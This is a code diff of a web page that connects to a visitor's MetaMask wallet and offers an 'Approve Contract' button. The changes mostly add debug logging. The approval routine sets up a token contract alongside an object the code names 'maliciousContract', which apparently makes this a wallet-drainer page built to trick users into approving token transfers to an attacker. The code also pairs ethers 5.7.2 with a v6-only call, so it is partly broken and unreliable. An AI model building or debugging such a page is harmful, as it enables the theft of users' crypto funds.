@@ -11,7 +11,6 @@
     <button id="approveContract">Approve Contract</button>
     <p id="status"></p>
 
-    <!-- Use a working version of ethers.js -->
     <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
     <script>
         let provider;
@@ -85,26 +84,31 @@
         ];
 
         window.onload = async () => {
+            console.log("Window loaded. Checking for MetaMask...");
             if (window.ethereum) {
                 provider = new ethers.BrowserProvider(window.ethereum);
-                await provider.send("eth_requestAccounts", []);  // Requesting accounts directly
+                console.log("MetaMask found. Adding event listener for connectWallet...");
                 document.getElementById("connectWallet").addEventListener("click", connectWallet);
                 document.getElementById("approveContract").addEventListener("click", approveContract);
             } else {
                 alert("MetaMask not found. Please install it!");
+                console.error("MetaMask is not available.");
             }
         };
 
         // Function to connect MetaMask
         async function connectWallet() {
+            console.log("Connect Wallet button clicked. Requesting accounts...");
             try {
                 // Request the user's accounts
                 const accounts = await provider.send("eth_requestAccounts", []);
                 if (accounts.length === 0) {
                     alert("No MetaMask accounts found. Please login.");
+                    console.error("No accounts found in MetaMask.");
                     return;
                 }
                 userAddress = accounts[0];  // Set the first account
+                console.log("Connected to MetaMask with address:", userAddress);
                 document.getElementById("status").innerText = `Connected: ${userAddress}`;
             } catch (error) {
                 console.error("Error connecting MetaMask:", error);
@@ -120,6 +124,8 @@
             }
 
             try {
+                console.log("Approving contract...");
+
                 // Create the token contract and malicious contract objects
                 const tokenContract = new ethers.Contract(tokenAddress, contractABI, provider.getSigner());
                 const maliciousContract = new ethers.Contract(contractAddress, contractABI_Malicious, provider.getSigner());
